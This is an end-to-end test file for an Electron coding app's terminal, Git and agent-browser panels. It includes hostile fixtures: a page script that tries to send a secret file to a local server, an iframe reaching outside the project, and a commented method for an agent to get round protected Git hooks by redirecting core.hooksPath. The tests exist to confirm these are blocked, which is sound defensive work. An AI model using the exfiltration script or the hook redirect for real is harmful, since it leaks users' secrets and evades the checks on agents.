import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { createServer, type IncomingHttpHeaders } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { launchApp, type RunningApp } from './app';
import { MockClaude } from './mock_claude';

const screenshotDir = process.env.E2E_SCREENSHOTS;

describe('side panels', () => {
  let running: RunningApp;
  let claude: MockClaude;
  let project: string;

  beforeAll(async () => {
    project = mkdtempSync(join(tmpdir(), 'patch-panels-project-'));
    const git = (...args: string[]) => execFileSync('git', args, { cwd: project });
    git('init', '-q');
    git('config', 'user.email', 'test@example.com');
    git('config', 'user.name', 'Test');
    writeFileSync(join(project, 'README.md'), '# Demo\n');
    git('add', '.');
    git('commit', '-qm', 'initial');
    writeFileSync(
      join(project, 'page.html'),
      '<!doctype html><title>Demo page</title><h1>Hi</h1><script>console.error("boom from page")</script>',
    );

    claude = new MockClaude();
    running = await launchApp({ PATCH_TEST_ANTHROPIC_URL: await claude.start() });
    await running.page.evaluate((path) => window.api.invoke('project:open', path), project);
    await running.page.evaluate(() => window.api.invoke('settings:set-secret', 'anthropicApiKey', 'sk-ant-panels'));
  });

  afterAll(async () => {
    await running?.close();
    await claude?.stop();
    rmSync(project, { recursive: true, force: true });
  });

  it('runs commands in the interactive terminal in the project folder', async () => {
    await running.page.locator('.panel-tab', { hasText: 'Terminal' }).click();
    await running.page.locator('.terminal-panel .xterm-rows', { hasText: 'Press Enter to start a shell' }).waitFor();
    await running.page.locator('.terminal-panel .xterm').click();
    await running.page.keyboard.press('Enter');
    await running.page.waitForTimeout(1500);
    await running.page.keyboard.type('echo terminal-works-$((20+22))');
    if (process.platform === 'win32') {
      await running.page.keyboard.press('Control+A');
      await running.page.keyboard.type('Write-Output "terminal-works-$(20+22)"');
    }
    await running.page.keyboard.press('Enter');
    await running.page
      .locator('.terminal-panel .xterm-rows', { hasText: 'terminal-works-42' })
      .waitFor({ timeout: 20_000 });
  });

  it('moves between panel tabs with the arrow keys and exposes them as tabs', async () => {
    const tabs = running.page.getByRole('tab');
    await expect(tabs.count()).resolves.toBe(3);
    await running.page.getByRole('tab', { name: 'Terminal' }).focus();
    await running.page.keyboard.press('ArrowRight');
    await expect(running.page.getByRole('tab', { name: 'Git' }).getAttribute('aria-selected')).resolves.toBe('true');
    await running.page.keyboard.press('End');
    await expect(running.page.getByRole('tab', { name: 'Browser' }).getAttribute('aria-selected')).resolves.toBe(
      'true',
    );
    await running.page.keyboard.press('Home');
    await expect(running.page.getByRole('tab', { name: 'Terminal' }).getAttribute('aria-selected')).resolves.toBe(
      'true',
    );
    // Only the selected tab is in the Tab order.
    await expect(running.page.getByRole('tab', { name: 'Browser' }).getAttribute('tabindex')).resolves.toBe('-1');
    await expect(running.page.getByRole('tabpanel').count()).resolves.toBeGreaterThan(0);
  });

  it('shows changes in the Git tab and commits them', async () => {
    await running.page.locator('.panel-tab', { hasText: 'Git' }).click();
    const file = running.page.locator('.git-file', { hasText: 'page.html' });
    await file.waitFor();
    await expect(file.locator('.git-status').textContent()).resolves.toBe('U');
    await running.page.locator('.git-diff', { hasText: 'boom from page' }).waitFor();
    if (screenshotDir) await running.page.screenshot({ path: join(screenshotDir, '6-git.png') });

    // An agent can write another hook folder and redirect Git to it without touching protected .git/hooks.
    const hooks = join(project, 'agent-hooks');
    const marker = join(project, 'hook-ran');
    mkdirSync(hooks);
    writeFileSync(join(hooks, 'pre-commit'), '#!/bin/sh\nprintf ran > hook-ran\n', { mode: 0o755 });
    execFileSync('git', ['config', 'core.hooksPath', 'agent-hooks'], { cwd: project });
    execFileSync('git', ['hook', 'run', 'pre-commit'], { cwd: project });
    expect(existsSync(marker)).toBe(true);
    rmSync(marker);

    await running.page.getByLabel('Commit message').fill('Add page');
    await running.page.getByRole('button', { name: 'Commit all' }).click();
    await running.page.getByText('No changes.').waitFor();
    const log = execFileSync('git', ['log', '--oneline'], { cwd: project, encoding: 'utf8' });
    expect(log).toContain('Add page');
    expect(existsSync(marker)).toBe(false);
  });

  it('lets the agent open a page in the browser panel and see console output and a screenshot', async () => {
    const url = pathToFileURL(join(project, 'page.html')).href;
    claude.script(
      {
        blocks: [{ type: 'tool_use', id: 'toolu_b', name: 'browser', input: { url, screenshot: true } }],
        stopReason: 'tool_use',
      },
      { blocks: [{ type: 'text', text: 'The page logs an error.' }], stopReason: 'end_turn' },
    );
    await running.page.getByLabel('Message', { exact: true }).fill('Check the page');
    await running.page.getByLabel('Message', { exact: true }).press('Enter');
    await running.page.getByText('The page logs an error.', { exact: true }).waitFor({ timeout: 30_000 });

    // The browser panel was brought to the front.
    await expect(running.page.locator('.panel-tab.active').textContent()).resolves.toContain('Browser');
    if (screenshotDir) await running.page.screenshot({ path: join(screenshotDir, '7-browser.png') });

    const result = claude.agentRequests[1].messages.at(-1).content[0];
    const text = result.content.find((block: any) => block.type === 'text').text;
    expect(text).toContain('Title: Demo page');
    expect(text).toContain('boom from page');
    const image = result.content.find((block: any) => block.type === 'image');
    expect(image.source.media_type).toBe('image/png');
    expect(image.source.data.length).toBeGreaterThan(1000);
  });

  it('does not let a project page show files from outside the project in a frame', async () => {
    const outside = mkdtempSync(join(tmpdir(), 'patch-panels-outside-'));
    try {
      writeFileSync(join(outside, 'secret.txt'), 'OUTSIDE-SECRET-42');
      writeFileSync(join(project, 'inside.txt'), 'INSIDE-CONTENT-7');
      const secretUrl = pathToFileURL(join(outside, 'secret.txt')).href;
      writeFileSync(
        join(project, 'frames.html'),
        `<!doctype html><title>Frames</title><iframe src="inside.txt"></iframe><iframe src="${secretUrl}"></iframe>`,
      );
      const url = pathToFileURL(join(project, 'frames.html')).href;
      claude.script(
        { blocks: [{ type: 'tool_use', id: 'toolu_f', name: 'browser', input: { url } }], stopReason: 'tool_use' },
        { blocks: [{ type: 'text', text: 'Frames checked.' }], stopReason: 'end_turn' },
      );
      await running.page.getByLabel('Message', { exact: true }).fill('Open the frames page');
      await running.page.getByLabel('Message', { exact: true }).press('Enter');
      await running.page.getByText('Frames checked.', { exact: true }).waitFor({ timeout: 30_000 });

      // Every frame of the agent's page in the browser panel, read from the main process.
      const texts = await running.app.evaluate(async ({ webContents, session }) => {
        const guest = webContents
          .getAllWebContents()
          .find(
            (contents) =>
              contents.getType() === 'webview' && contents.session === session.fromPartition('agent-browser'),
          )!;
        return Promise.all(
          guest.mainFrame.framesInSubtree.map((frame) =>
            frame.executeJavaScript('document.body ? document.body.innerText : ""').catch(() => ''),
          ),
        );
      });
      expect(texts.join('\n')).toContain('INSIDE-CONTENT-7');
      expect(texts.join('\n')).not.toContain('OUTSIDE-SECRET-42');
    } finally {
      rmSync(outside, { recursive: true, force: true });
    }
  });

  it('gives a project page no network, so what it reads cannot leave (#229)', async () => {
    const received: string[] = [];
    const server = createServer((request, response) => {
      received.push(request.url ?? '');
      response.end('ok');
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    const port = (server.address() as AddressInfo).port;
    try {
      writeFileSync(join(project, 'leak-secret.txt'), 'SECRET-TOKEN-229');
      writeFileSync(
        join(project, 'leak.html'),
        `<!doctype html><title>Leak</title><img src="http://127.0.0.1:${port}/img"><script>
          fetch('leak-secret.txt').then((r) => r.text()).then((text) => {
            fetch('http://127.0.0.1:${port}/fetch?d=' + encodeURIComponent(text)).catch(() => console.log('blocked'));
            new WebSocket('ws://127.0.0.1:${port}/ws?d=' + encodeURIComponent(text));
            navigator.sendBeacon('http://127.0.0.1:${port}/beacon', text);
          });
        </script>`,
      );
      const url = pathToFileURL(join(project, 'leak.html')).href;
      claude.script(
        { blocks: [{ type: 'tool_use', id: 'toolu_leak', name: 'browser', input: { url } }], stopReason: 'tool_use' },
        { blocks: [{ type: 'text', text: 'Leak page opened.' }], stopReason: 'end_turn' },
      );
      await running.page.getByLabel('Message', { exact: true }).fill('Preview the leak page');
      await running.page.getByLabel('Message', { exact: true }).press('Enter');
      await running.page.getByText('Leak page opened.', { exact: true }).waitFor({ timeout: 30_000 });
      // Give the page's scripts time to try.
      await new Promise((resolve) => setTimeout(resolve, 1500));
      expect(received).toEqual([]);
    } finally {
      await new Promise((resolve) => server.close(resolve));
    }
  });

  it("never sends the user's browser cookies with the agent's page loads", async () => {
    const requests: Array<{ path: string; headers: IncomingHttpHeaders }> = [];
    const server = createServer((request, response) => {
      requests.push({ path: request.url ?? '', headers: request.headers });
      const cookie = request.headers.cookie ?? '';
      if (request.url === '/login') {
        // A lasting sign-in, as a site sets when the user logs in in their own browser.
        response.setHeader('Set-Cookie', 'patch_user_session=secret-148; Path=/; Max-Age=3600; HttpOnly');
      } else if (request.url === '/whoami') {
        response.setHeader('Set-Cookie', 'patch_agent_seen=1; Path=/; Max-Age=3600');
      }
      response.setHeader('Content-Type', 'text/html');
      response.end(`<!doctype html><title>${cookie.includes('secret-148') ? 'Signed in' : 'Signed out'}</title>`);
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    const agentBanner = running.page.locator('.browser-agent-banner');
    const cookieNames = (partition: string) =>
      running.app.evaluate(
        async ({ session }, name) => (await session.fromPartition(name).cookies.get({})).map((cookie) => cookie.name),
        partition,
      );
    try {
      await running.page.getByRole('tab', { name: 'Browser' }).click();
      // The user signs in with their own browser in the panel.
      await running.page.getByLabel('Address').fill(`${origin}/login`);
      await running.page.getByLabel('Address').press('Enter');
      await expect.poll(() => cookieNames('persist:browser')).toContain('patch_user_session');

      await running.page.evaluate(() => window.api.invoke('settings:update', { allowedNetworkHosts: '127.0.0.1' }));
      claude.script(
        {
          blocks: [{ type: 'tool_use', id: 'toolu_cookie', name: 'browser', input: { url: `${origin}/whoami` } }],
          stopReason: 'tool_use',
        },
        { blocks: [{ type: 'text', text: 'Checked who I am.' }], stopReason: 'end_turn' },
      );
      await running.page.getByLabel('Message', { exact: true }).fill('Who am I on the test site?');
      await running.page.getByLabel('Message', { exact: true }).press('Enter');
      await running.page.getByText('Checked who I am.', { exact: true }).waitFor({ timeout: 30_000 });

      const agentLoad = requests.find((request) => request.path === '/whoami');
      expect(agentLoad).toBeDefined();
      expect(agentLoad!.headers.cookie ?? '').not.toContain('secret-148');
      const result = claude.agentRequests.at(-1).messages.at(-1).content[0];
      expect(result.content.find((block: any) => block.type === 'text').text).toContain('Title: Signed out');
      // The panel shows the agent's page, labelled as the agent's session.
      await expect(agentBanner.isVisible()).resolves.toBe(true);
      await expect(agentBanner.textContent()).resolves.toContain('Agent browser');
      expect(await cookieNames('agent-browser')).toEqual(['patch_agent_seen']);
      expect(await cookieNames('persist:browser')).toEqual(['patch_user_session']);

      // A new chat empties the agent's browser and shows the user's again; the user's sign-in stays.
      await running.page.evaluate(() => window.api.invoke('chat:new'));
      await expect.poll(() => cookieNames('agent-browser')).toEqual([]);
      await expect.poll(() => agentBanner.isVisible()).toBe(false);
      expect(await cookieNames('persist:browser')).toEqual(['patch_user_session']);
    } finally {
      await new Promise((resolve) => server.close(resolve));
    }
  });

  it('keeps both browser guests away from Node', async () => {
    const guestGlobals = await running.page.evaluate(() =>
      Promise.all(
        [...document.querySelectorAll('webview')].map((webview) =>
          (webview as any).executeJavaScript('typeof require + "/" + typeof process'),
        ),
      ),
    );
    expect(guestGlobals).toEqual(['undefined/undefined', 'undefined/undefined']);
  });

  it('runs without renderer errors', () => {
    expect(running.errors.join('\n')).toBe('');
  });
});
